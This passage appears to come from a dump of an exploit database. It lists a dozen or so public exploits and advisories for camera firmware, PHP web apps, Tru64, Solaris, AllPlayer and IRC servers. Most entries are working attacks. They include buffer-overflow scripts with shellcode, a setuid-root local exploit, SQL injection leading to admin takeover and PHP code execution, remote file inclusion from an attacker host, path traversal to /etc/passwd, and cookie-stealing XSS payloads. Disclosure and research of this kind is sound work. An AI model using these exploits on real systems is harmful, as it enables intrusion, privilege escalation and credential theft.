at least one proxy filtering the 'Network.SMTP.Receivers' parameter in HTTP requests to '/cgi-bin/user/Config.cgi'.   6. *Credits*  [CVE-2013-4980] was discovered and researched by Anibal Sacco from Core Security Exploit Writers Team. [CVE-2013-4981] and [CVE-2013-4982] were discovered and researched by Facundo Pantaleo from Core Security Consulting Team.   7. *Technical Description / Proof of Concept Code*   7.1. *Buffer Overflow in RTSP Packet Handler*  [CVE-2013-4980] The following Python script sends a specially crafted packet that triggers a buffer overrun condition when handling the RTSP transaction; no authentication is required. As a result, the device crashes and it could possibly lead to a remote code execution.  /----- import socket  HOST = '192.168.1.1' PORT = 554               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) trigger_pkt = ""SETUP Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2AaLSaLS RTSP/1.0\r\n"" trigger_pkt += ""CSeq: 1\r\n"" trigger_pkt += ""User-Agent: VLC media player (LIVE555 Streaming Media v2010.02.10)\r\n\r\n"" print ""[*] Sending trigger"" s.sendall(trigger_pkt) data = s.recv(1024) print '[*] Response:', repr(data), ""\r\n"" s.close() -----/   7.2. *Buffer Overflow in config.cgi Parameters*  [CVE-2013-4981] The following Python script exploits other buffer overflow condition; no authentication is required. As a result, the device crashes and it would possible lead to a remote code execution.   /----- import httplib  ip = ""192.168.1.1"" conn = httplib.HTTPConnection(ip) conn.request(""POST"", ""/cgi-bin/user/Config.cgi?action=set&Network.SMTP.Receiversresp = conn.getresponse() print resp.read() -----/   7.3. *CAPTCHA Bypass*  [CVE-2013-4982] The following Python proof of concept sends a wrong captcha in first place (just to verify that captcha protection is enabled); then, it sends ten requests with an arbitrary hardcoded captcha and its matching verification code. As a result, the captcha protection can by completely bypassed.   /----- import httplib  ip = ""192.168.1.1"" print ""Performing captcha replay with hardcoded wrong captcha code and verify code..."" conn = httplib.HTTPConnection(ip) conn.request(""GET"", ""/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc HTTP/1.1"") resp = conn.getresponse() print ""Reading webpage..."" print resp.read() print ""Performing several captcha replays with hardcoded right captcha code and verify code..."" for i in range(1, 10):     conn = httplib.HTTPConnection(ip)     conn.request(""GET"", ""/cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc HTTP/1.1"")     resp = conn.getresponse()     print ""Reading webpage...""     print resp.read()  -----/   8. *Report Timeline*  . 2013-08-06: Core Security Technologies attempts to contact vendor using the AVTECH official technical support contact page [2]. No reply received.  . 2013-08-12: Core attempts to contact vendor.  . 2013-08-20: Core attempts to contact vendor.  . 2013-08-28: After 3 attempts to contact vendor, the advisory CORE-2013-0726 is released as 'user release'.   9. *References*  [1] http://www.avtech.com.tw. [2] http://www.avtech.com.tw/index.php?option=com_content&view=article&id=244&Itemid=453&lang=en.    10. *About CoreLabs*  CoreLabs, the research center of Core Security Technologies, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.   11. *About Core Security Technologies*  Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.  Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.   12. *Disclaimer*  The contents of this advisory are copyright (c) 2013 Core Security Technologies and (c) 2013 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/.   13. *PGP/GPG Keys*  This advisory has been signed with the GPG key of Core Security Technologies advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.",remote,dos,1
14203,"TCW PHP Album - Multiple Vulnerabilities 1               ##########################################             1 0               I'm L0rd CrusAd3r member from Inj3ct0r Team            1 1               ##########################################             0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=1  Author: L0rd CrusAd3r aka VSN [crusader_hmg@yahoo.com] Exploit Title: TCW PHP Album Multiple Vulnerability Vendor url:http://tcwphpalbum.sourceforge.net/ Version:1 Published: 2010-07-4 Greetz to:r0073r (inj3ct0r.com), Sid3^effects, MaYur, MA1201, Sonic Bluehat, Sai, KD, M4n0j. Special Greetz: Topsecure.net, inj3ct0r Team ,Andhrahackers.com Shoutzz:- To all ICW members. ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~ Description:  TCW PHP Album is a set of PHP scripts that (using MySQL and the GD Library) allow you to easily make online multimedia albums. With an intuitive administrative panel you can quickly add albums, photos, themes, and change site settings. It also has commenting, where people can post comments on images and numerically rate pictures, as well as other features such as IP restriction/banning. Recently added, you can also make automatic slideshows. TCW PHP Album requires the following:      * PHP 4.1.2 or higher, --with-mysql     * The GD Image Library OR ImageMagick's Convert     * Minimum of PNG support for the above     * A MySQL database - tested with 3.2x     * TCW PHP Album is operating system independent. TCW PHP Album does not support the GD Image library as it is lacking many features of convert, but the option is available.  ~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~  Vulnerability:  *SQL Vulnerability  DEMO URL:  http://server/photos/index.php?album=[sqli]  *XSS Vulnerability  DEMO URL :  http://server/photos/index.php?album=[xss]  *URL Redirection Vulnerability  DEMO URL:  http://server/photos/index.php?album=[urlredirection]  *HTML Injection  DEMO URL:  http://server/photos/index.php?album=[html]  # 0day n0 m0re # # L0rd CrusAd3r #   --  With R3gards, L0rd CrusAd3r",remote,webapps,1
8279,"PHPizabi 0.848b C1 HFP1 - Privilege Escalation -------------------------------------------------------------------------------- PHPizabi v0.848b C1 HFP1 proc.inc.php remote privilege escalation (php.ini independent) by Nine:Situations:Group::bookoo -------------------------------------------------------------------------------- our site: http://retrogod.altervista.org/ software site: http://www.phpizabi.net/ --------------------------------------------------------------------------------  vulnerability: sql injection in /theme/default/proc.inc.php  <?php  	function bufferProcParse($buffer) { 		global $CONF; 		 		$tpl = new template; 		$tpl -> LoadThis($buffer); 		// HANDLE POSTED NOTEPAD DATA /////////////////////////////////////////////////////// 		if (isset($_GET[""notepad_body""])) { 			myQ(""UPDATE `[x]users` SET `notepad_body` = '"".urldecode($_GET[""notepad_body""]).""' WHERE `id`='"".me(""id"").""'""); 			me(""flush""); 		} ...  note urldecode() ...  exploitation, manual:  injection urls:  change username and password of an existing user: [sql]', username = 'bookoo', password = md5('pass') WHERE username = 'user'/* which becomes: http://host/path_to_phpizabi/?notepad_body=%2527,%20username%20=%20%2527bookoo%2527,%20password%20=%20md5(%2527pass%2527)%20WHERE%20username%20=%20%2527user%  2527/*  grant yourself admin rights: [sql]', is_moderator = 1, is_administrator = 1, is_superadministrator = 1 WHERE username = 'bookoo'/* which becomes:  http://host/path_to_phpizabi/?notepad_body=%2527,%20is_moderator%20=%201,%20is_administrator%20=%201,%20is_superadministrator%20=%201%20WHERE%20username%20=%  20%2527bookoo%2527/*  navigate:  http://host/path_to_phpizabi/?L=admin.index  boom !  now go to:  http://host/path_to_phpizabi/?L=admin.cms.edit&id={cms.file}  use this opening and closing tag style, example:  <script language=""php""> system(""ls -la""); </script>  (it is always availiable, see:http://www.php.net/manual/en/language.basic-syntax.phpmode.php) because of that preg_replace() in /modules/admin/cms/edit.php :  ... 	if (isset($_POST[""Submit""])) { 		if ($handle = fopen(""modules/cms/{$_GET[""id""]}.php"", ""w"")) { 			 			$body = 				""<?php if (!defined(\""CORE_STRAP\"")) die(); ?>\n"" 				.preg_replace('#(<\\?.*\\?>)|(<%.*%>)|<\\?php|<\\?|\\?>|<%|%>#si', NULL, stripslashes($_POST[""body""][0])) 				.""\n<!-- Edited by "".me(""username"")."" on "".date($CONF[""LOCALE_HEADER_DATE_TIME""])."" -->""; 			; 			 			fwrite($handle, $body); 			fclose($handle); ...  which is bypassed.  save changes and navigate:  http://host/path_to_phpizabi/?L=cms._cms_file_  to see the output...  now visit log page:  http://192.168.0.1/phpizabi/?L=admin.logs.logs  ... --------------------------------------------------------------------------------  # milw0rm.com [2009-03-24]",remote,webapps,1
39266,"SeaWell Networks Spectrum - Multiple Vulnerabilities # Exploit Title: [SeaWell Networks Spectrum - Multiple Vulnerabilities] # Discovered by: Karn Ganeshen # Vendor Homepage: [http://www.seawellnetworks.com/spectrum/] # Versions Reported: [Spectrum SDC 02.05.00, Build 02.05.00.0016]   CVE-ID: CVE-2015-8282 CVE-2015-8283 CVE-2015-8284  About SeaWell Networks Spectrum  Session Delivery Control  SeaWell set out to improve the way operators control, monetize and scale their IP video offerings, to meet the growing subscriber demands for video delivered to smartphones, tablets and game consoles.  The result – Spectrum – is what we call a “Multiscreen 2.0” Session Delivery Controller.  Spectrum is high-performance, carrier-grade software that takes ABR video and repackages it – on-the-fly – into any other protocol, including Apple HLS, Adobe HDS, Microsoft Smooth Streaming and MPEG-DASH.  http://www.seawellnetworks.com/spectrum/  Affected version Spectrum SDC 02.05.00 Build 02.05.00.0016 Copyright (c) 2015 SeaWell Networks Inc.  A. CWE-255: Credentials Management CVE-2015-8282  Weak, default login credentials - admin / admin  B. CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') CVE-2015-8283  The configure_manage.php module accepts a file parameter which takes an unrestricted file path as input, allowing an attacker (non-admin, low- privileged user) to read arbitrary files on the system.  PoC:  https://IP/configure_manage.php?action=download_config&file=../../../../../../../../../etc/passwd  C. CWE-285: Improper Authorization CVE-2015-8284  A low privileged, non-admin user, with only viewer privileges, can perform administrative functions, such as create, update, delete a user (including admin user), or access device's configuration files (policy.xml, cookie_config.xml, systemCfg.xml). The application lacks Authorization controls to restrict any non-admin users from performing admin functions.  The application users can have admin or viewer privilege levels. Admin has full access to the device. Viewer has access to very restricted functions.  It is possible for a viewer priv user to perform admin functions.  PoC:  Add new user [Admin function only]  GET /system_manage.php?username=viewer&password=viewer&password=viewer&userlevel=1&action=add_user&ekey=&LActiveRow= HTTP/1.1  https://IP/system_manage.php?username=viewer1&password=viewer&password=viewer&userlevel=9&action=add_user&ekey=&LActiveRow=  Here  admin -> userlevel=9 viewer -> userlevel=1  Create new user with Admin privs Log in as viewer - try create new admin user - viewer1  https://IP/system_manage.php?username=viewer1&password=viewer&password=viewer&userlevel=9&action=add_user&ekey=&LActiveRow=  <result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>  Delete user  https://IP/system_manage.php?username=viewer1&password=&password=&userlevel=9&action=delete_user&ekey=4&LActiveRow=sys_Luser_4  Modify existing user (including admin) log in as viewer - try change system (admin) user  https://IP/system_manage.php?username=system&password=&password=&userlevel=9&action=delete_user&ekey=4&LActiveRow=sys_Luser_4  <result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>  Change Admin password log in as viewer - try change admin pass  https://IP/system_manage.php?username=admin&password=admin1&password=admin1&userlevel=9&action=update_user&ekey=3&LActiveRow=sys_Luser_3  <result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>  Downloading configuration xml files  viewer priv user has no access/option to config xmls via GUI. It is possible to download the configs by calling the url directly  Access policy config xml https://IP/configure_manage.php?action=download_config&file=policy.xml  Access cookie config xml https://IP/configure_manage.php?action=download_config&file=cookie_config.xml  Access system config xml https://IP/configure_manage.php?action=download_config&file=systemCfg.xml  +++++ --  Best Regards, Karn Ganeshen",remote,webapps,1
21807,"HP Tru64/OSF1 DXTerm - Local Buffer Overflow source: https://www.securityfocus.com/bid/5746/info  The HP Tru64/OSF1 dxterm utility is prone to a locally exploitable buffer overflow condition. This issue is due to insufficient checking of command line input supplied via the ""-xrm"" parameter. This parameter serves the same purpose as the ""-customization"" command line parameter, which is also not sufficiently checked.   Since this utility is installed setuid root, code execution that results from successful exploitation of this issue will yield root privileges on the system.  #!/usr/bin/perl -w # # Tru64 5.1 /usr/bin/X11/dxterm # # stripey (stripey@snosoft.com) - 03/07/2002 #  ($offset) = @ARGV,$offset || ($offset = 0);  $ret_addr = pack(""ll"",(0x4001c828+$offset),0x1);  $sc .= ""\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42""; $sc .= ""\xfc\xff\x32\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2""; $sc .= ""\xff\x47\x3f\x26\x1f\x04\x31\x22\xfc\xff\x30\xb2""; $sc .= ""\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11\x14\xe3\x43""; $sc .= ""\x20\x35\x20\x42\xff\xff\xff\xff\x30\x15\xd9\x43""; $sc .= ""\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e\xb6""; $sc .= ""\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22""; $sc .= ""\x13\x05\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26""; $sc .= ""\x2f\x62\x73\x22\x38\xff\x7e\xb2\x13\x94\xe7\x43""; $sc .= ""\x20\x35\x60\x42\xff\xff\xff\xff"";  $buf_a .= pack(""l"",0x47ff041f)x2048; $buf_a .= $sc; $buf_a .= $ret_addr;  exec(""/usr/bin/X11/dxterm"",""-customization"",$buf_a);",local,local,1
15643,"Pandora Fms 3.1 - Directory Traversal / Local File Inclusion [+] Introduction  Pandora FMS (for Pandora Flexible Monitoring System) is a software solution for monitoring computer networks. It allows monitoring in a visual way the status and performance of several parameters from different operating systems, servers, applications and hardware systems such as firewalls, proxies, databases, web servers or routers.  It can be deployed in almost any operating system. It features remote monitoring (WMI, SNMP, TCP. UDP, ICMP, HTTP...) and it can also use agents. An agent is available for each platform. It can also monitor hardware systems with a TCP/IP stack, such as load balancers, routers, network switches, printers or firewalls.  This software has several servers that process and get information from different sources, using WMI for gathering remote Windows information, a predictive server, a plug-in server which makes complex user-defined network tests, an advanced export server to replicate data between different sites of Pandora FMS, a network discovery server, and an SNMP Trap console.  Released under the terms of the GNU General Public License, Pandora FMS is free software.  5) Path Traversal:  5.1 - PHP File Inclusion (or RFI/LFI: Remote/Local file inclusion) - CVE-2010-4281 -CVE-2010-4282 - CVSS 8.5/10  Parameter 'page' of ajax.php is not properly sanitizing user-supplied input. The function safe_url_extraclean is filtering ':' character, and it doesn't allow to use the string ""http://""; to create urls, but allows '/' character and an attacker could reference remote resources via Windows UNC files, using //servername//resource/file  Note that the first check in safe_url_extraclean is filtering '://', so we can bypass the filter easily doing http://http://url, and it only strip the first protocol://. However, the last preg_replace strips the : character.  Proof of concept:  UNC: http://servername/pandora_console/ajax.php?page=//server/share/test  As well, ajax.php allows to include any php file in the disk  filesystem: http://servername/pandora_console/ajax.php?page=../../../../../directory/file  Character %00 is not allowed due safe_url_extraclean function filtering, and is not possible to include other files distinct that php files, but still allows . and / characters.   5.2 - PHP File Inclusion (or RFI Remote file inclusion) - CVE-2010-4283 - - CVSS 7.9/10  An attacker can inject arbitrary PHP code and execute it remotely due argv[1] parameter is not filtered in file pandora_diag.php.  PoC: http://servername/pandora_console/extras/pandora_diag.php?argc=2&argv[1]=http://serverattacker/salsa.php%00  Note: that issue needs register_globals set to On to be exploitable.   5.3 - Path traversal & Local file inclusion vulnerabilities - CVE-2010-4282 - CVSS 6.8/10  An attacker can include arbitrary files of the filesystem via id parameter in file pandora_help.php.   Snippet of vulnerable code:   24 $id = get_parameter ('id');  25  26 /* Possible file locations */  27 $files = array ($config[""homedir""].""/include/help/"".$config[""language""].""/help_"".$id."".php"",  28 $config[""homedir""].ENTERPRISE_DIR.""/include/help/"".$config[""language""].""/help_"".$id."".php"",  29 $config[""homedir""].ENTERPRISE_DIR.""/include/help/en/help_"".$id."".php"",  30         $config[""homedir""].""/include/help/en/help_"".$id."".php"");  31 $help_file = '';  32 foreach ($files as $file) {  33         if (file_exists ($file)) {  34                 $help_file = $file;  35                 break;  36         }  37 } ...  62 require_once ($help_file);   Proof of concept:  http://servername/pandora_console/general/pandora_help.php?id=/../../../../../../../boot.ini%00  This code is platform dependent bug, you can read more at http://seclists.org/fulldisclosure/2010/Jul/137 Only works in windows systems, an attacker can include local file using ../ characters due parameter id is not filtered If magic_quotes_gpc is Off, arbitrary files can be included, like boot.ini using NULL character (%00), if not, only php files are allowed   5.4 - Path traversal & Arbitrary write and delete files - CVE-2010-4282 - - CVSS 8.0/10  In file operation/agentes/networkmap.php the 'layout' parameter is handled in an insecure way and it is used to write and delete files on the filesystem. An attacker could use this parameter to write in arbitrary paths and even remove files.  Snippet of vulnerable code:  32 $layout = (string) get_parameter ('layout', 'radial'); ... 137 $filename_map = $config[""attachment_store""].""/networkmap_"".$layout; 138 $filename_img = ""attachment/networkmap_"".$layout.""_"".$font_size; 139 $filename_dot = $config[""attachment_store""].""/networkmap_"".$layout; ... 157         $fh = @fopen ($filename_dot, 'w'); 158         if ($fh === false) { 159                 $result = false; 160         } else { 161                 fwrite ($fh, $graph); 162                 $cmd = ""$filter -Tcmapx -o"".$filename_map."" -Tpng - -o"".$filename_img."" "".$filename_dot; 163                 $result = system ($cmd); 164                 fclose ($fh); 165                 unlink ($filename_dot); 166         } ... 178         require ($filename_map);   Character sequences '../' could be used to write files (due -o parameter in lines 162 and 163), as well as potentially remove files (line 157, 161 and 165) or include them (line 178) As well like in 5.3 this issue is only exploitable in windows environments because the same reason.   [+] Impact  An attacker can execute commands of the operating system, inject remote code in the context of the application, get arbitrary files from the filesystem or extract any data of the database including passwords and confidential information about the monitored network/systems. Also it is possible to bypass the authentication or scale privileges to became admin, gaining full control of the web application and web server. These vulnerabilities have a high impact to the confidentiality, integrity, and availability of the system.   [+] Systems affected  Versions prior and including 3.1 of Pandora FMS are affected   [+] Solution  Apply the security fix for version 3.1: http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/Final%20version%20%28Stable%29/pandorafms_console-3.1_security_patch_13Oct2010.tar.gz/download   Or upgrade to version 3.1.1 from http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/3.1.1/   [+] Timeline  Ago 2010: First contact to vendor Ago 2010: Confirmation of vendor Sept 2010: Second contact: SQL Injection vulnerabilities Sept 2010: Confirmation that the fix will be released on October Oct 2010: PandoraFMS security patch for 3.1 version released Oct 2010: Request for CVE numbers Nov 2010: PandoraFMS version 3.1.1 released Nov 2010: Disclosure of this advisory   [+] References  Official PandoraFMS site: http://pandorafms.org/ SourceForge PandoraFMS site: http://sourceforge.net/projects/pandora/ Wikipedia entry about PandoraFMS: http://en.wikipedia.org/wiki/Pandora_FMS Common Vulnerability Scoring System (CVSS) v2 calculator: http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2 Common Vulnerabilities and Exposures (CVE): http://cve.mitre.org/   [+] Credits  These vulnerabilities has been discovered by Juan Galiana Lara - @jgaliana - http://juangaliana.blogspot.com/  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (GNU/Linux)  iQIcBAEBAgAGBQJM9NctAAoJEJaV5RMdiDI7cTMP/jzyDB8hcuTGYy+hHnehx0Fy YbVmWTMCUhIHZ6Y6ke1xLbFf0itFm/tMSvqC/20cAKC0x+QEmEVoSJPerT+Fc/3s IVjIEMxBbaKNM6inAElng5BzC0MTOjI+njtpF7pmLaIFBy8C77+u/LNrSM7tucy9 WIx6ILVGSO0LY5vfgwdRAcJow6p/wn50U4Ur2XOVZ/X10Gbsb+9qMd4+q1d87Cw4 cC+mqTefLeP8FNh6PB2tJpdpQqJ3R2G8719fHgmDm/5SVBkoXZRhjHKokR9+wtzP JPJWP3z1Zt+Wtn3+ANakDItBenbgafM2lMe0tkiy9LoQKMKepibLqOf9xfrKqTnP 8CRffcV8nLorGBoKk7UKVb3I14llt34cu+Vcx2+WgDz37hXV1iK7pufGuFxVVRE4 7etidHR9n7gO1WPbLmrKq4rrR02zhYnAHsGwjtFQId3ufRGSBTno3yNHFj1j0EvH pARhwbRtjIiSk8JF3TjeTswGMpCIItpQ051K4Bcpbtzte7fX05CLoaF6xyJBJlS5 yNuxaBnGZYVOvUd+emosH+5ngW7Qk8/wXljx2OyVOu6ip75UZ277MRLBJvlq+NC4 oBllQOzv521fd5hkgYEQ8VZQgWCzbeRTuh+t4z+MUHKTQlcE2I0ba9C6xdn0nkZF sn9vRJk4gc/PozOXDjC3 =WmOh -----END PGP SIGNATURE-----",remote,webapps,1
32315,OpenDB 1.0.6 - 'user_profile.php?redirect_url' Cross-Site Scripting source: https://www.securityfocus.com/bid/30989/info    Open Media Collectors Database (OpenDb) is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.    An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.    OpenDb 1.0.6 is vulnerable; other versions may also be affected.   http://www.example.com/user_profile.php?uid=[USERNAME]&subject=No+Subject&redirect_link=Back+to+Statistics&redirect_url=javascript:alert(document.cookie),remote,webapps,1
46668,"AllPlayer 7.4 - SEH Buffer Overflow (Unicode) #!/usr/bin/python -w  # # Exploit Author: Chris Au # Exploit Title:  AllPlayer V7.4 - Local Buffer Overflow (SEH Unicode) # Date: 07-04-2019 # Vulnerable Software: AllPlayer V7.4 # Vendor Homepage: https://www.allplayer.org/ # Version: 7.4 # Software Link: http://allplayer.org/Download/ALLPlayerEN.exe # Tested Windows Windows 7 SP1 x86 # # # PoC # 1. generate evil.txt, copy contents to clipboard # 2. open AllPlayer # 3. select ""Open video or audio file"", click ""Open URL"" # 4. paste contents from clipboard # 5. select OK # 6. calc.exe #  filename=""evil.txt"" header = ""http://"" junk = ""\xcc"" * 301 nseh = ""\x90\x45"" seh = ""\x7a\x74"" #pop pop retn valign = ( ""\x55"" #push ebp ""\x45"" #align ""\x58"" #pop eax ""\x45"" #align ""\x05\x20\x11"" #add eax,11002000 ""\x45"" #align ""\x2d\x18\x11"" #sub eax,11001900 ""\x45"" #align ""\x50"" #push eax ""\x45"" #align ""\xc3"" #retn ) #nop to shell nop = ""\xcc"" * 115 shellcode = ( ""PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAI"" ""AQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIA"" ""JQYAZBABABABABkMAGB9u4JBkLK8qrM0ypyps0e9xeP1Y0RD4K"" ""npnPrkPRLLbkb2N42kt2lhlOegmzkvMaYodlMl0aqlKRnLo0Uq"" ""foLMzai7zBl2nrOgTKnrJptKNjoLBkpLjqahISQ8KQ8QpQRkaI"" ""kpKQYCbkMyzxHcnZq9bkNTTK9q9FMaYofLVa8OLMjaI7p8GpRU"" ""9flCamXxmksMo4d5JD1HrknxMTYq8Sc6RkJl0KtKnxKlkQFs4K"" ""zdtKKQJ0RiQ4NDLdOkOkC1pYOjOakOyPQOqOpZ4KN2zKTMaM0j"" ""kQbmu55bKP9pM0b0C8014KROQwkOIEek8pTuTbPVQXcvTU7MeM"" ""iohUOLm6qlyze09k7p0u9ugKa7mCPrbOqZ9pOcYoHURCPa0l0c"" ""Lnc51hOuipAA"") fill = ""\x45"" * 5000 buffer = header + junk + nseh + seh + valign + nop + shellcode + fill textfile = open(filename , 'w') textfile.write(buffer) textfile.close()",local,local,1
4546,ZZ FlashChat 3.1 - 'help.php' Local File Inclusion # Title : ZZ:FlashChat Local File Inclusion Vulnerability  # Source : http://download.zehnet.de/index.php  # Author : d3hydr8  # Homepage : http://www.darkc0de.com  # Vuln: : /chat/admin/inc/help.php?file=[LFI]  # milw0rm.com [2007-10-19],local,webapps,1
20764,"Solaris 2.6 - FTP Core Dump Shadow Password Recovery source: https://www.securityfocus.com/bid/2601/info  Solaris is the variant of the UNIX Operating System distributed by Sun Microsystems. Solaris is designed as a scalable operating system for the Intel x86 and Sun Sparc platforms, and operates on machines varying from desktop to enterprise server.  A problem in the ftp server included with the Solaris Operating System could allow a local user to recover parts of the shadow file, containing encrypted passwords. Due to a previously known problem involving a buffer overflow in glob(), it is possible to cause a buffer overflow in the Solaris ftp server, which will dump parts of the shadow file to core. This can be done with the CWD ~ command, using a non-standard ftp client.  Therefore, a local user could cause a buffer overflow in the ftp server, and upon reading the core file, recover passwords for other local users, potentially gaining elevated privileges.  [root@ /usr/sbin]> telnet localhost 21 Trying 127.0.0.1... Connected to localhost. Escape character is '^]'. 220 sun26 FTP server (SunOS 5.6) ready. user warning3 331 Password required for warning3. <-- a valid username pass blahblah <--- a wrong password 530 Login incorrect. CWD ~ 530 Please login with USER and PASS. Connection closed by foreign host. [root@ /usr/sbin]> ls -l /core -rw-r--r-- 1 root root 284304 Apr 16 10:20 /core [root@ /usr/sbin]> strings /core|more [...snip...] lp:NP:6445:::::: P:64 eH:::: uucp:NP:6445:::",remote,remote,1
9342,"elvin bts 1.2.2 - SQL Injection / Cross-Site Scripting _00000__00000__00000__00000__0___0__00000____0___0___000___0___0_ _0______0___0__0___0__0______00_00__0________00_00__0___0__00_00_ _0000___00000__00000__00000__0_0_0__00000____0_0_0__0___0__0_0_0_ _____0______0______0__0______0___0__0________0___0__00000__0___0_ _0000___00000__00000__00000__0___0__00000____0___0__0___0__0___0_ _________________________________________________________________    # [+] Elvin BTS 1.2.2 (SQL/XSS) Multiple Remote Vulnerabilities # [+] Software : Elvin BTS # [+] Author : 599eme Man # [+] Contact : Flouf@live.fr # [+] Thanks : Moudi, Neocoderz, Sheiry, Shimik Root aka Str0zen, Pr0H4ck3rz, Staker, Security-shell... # [+] Special : Moudi my Brozazaaaaaaaaaaaa # [+] Download : http://www.elvinbts.org/?Download # #[------------------------------------------------------------------------------------] #  # [+] Vulnerabilities # #	[+] SQL # #		- http://www.site.com/show_activity.php?id=null+union+select+1,2,3,4,5,version(),7,8-- #		 #			[+] Demo # #				- http://landfill.elvinbts.org/show_activity.php?id=null+union+select+1,2,3,4,5,version(),7,8-- # #	[+] XSS # #		- http://www.site.com/buglist.php?component=[XSS/IFRAME/REDIRECTION] # #		- http://www.site.com/buglist.php?priority=[XSS/IFRAME/REDIRECTION] # #		- http://www.site.com/createaccount.php => Username : ""'><script>alert('xss')</script> # 							=> E-mail : ""'><script>alert('xss')</script> # 							=> Pass : ""'><script>alert('xss')</script> # 							=> Confirm pass : ""'><script>alert('xss')</script> # #			[+] Demo # #				- http://landfill.elvinbts.org/buglist.php?component=%22%27%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E # # 				- http://landfill.elvinbts.org/buglist.php?priority=%22%27%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E # #				- http://landfill.elvinbts.org/createaccount.php # # # #[------------------------------------------------------------------------------------] # #########################################################################################################  # milw0rm.com [2009-08-03]",remote,webapps,1
5306,"Snircd 1.3.4 - 'send_user_mode' Denial of Service Affected software -----------------  ircu (upto and including 2.10.12.12) snircd (upto and including 1.3.4) and many other ircu derivatives  Vulnerability details ---------------------  send_user_mode in s_user.c does not check that the argument after a +r mode  is present, if it is not than the NULL sentinel may be missed, causing the  function to iterate over the boundary of the array.  One possible exploit: /mode nickname i i i i i i i i i i i i i i i r r r r s  This won't work if there's another NULL directly after the first from the  previous parsed command, if this is the case one can just append more modes  or send some other junk to the ircd.  Resolution ----------  Upgrade to the very latest version of ircu/snircd.  Disclosure timeline -------------------  2008-03-15: Vulnerability discovered by QuakeNet and reported to Undernet. 2008-03-15: Patches released. 2008-03-17: Patches applied to public servers. 2008-03-24: Public disclosure.  --  Chris Porter (slug on QuakeNet) http://www.warp13.co.uk  # milw0rm.com [2008-03-24]",local,dos,0
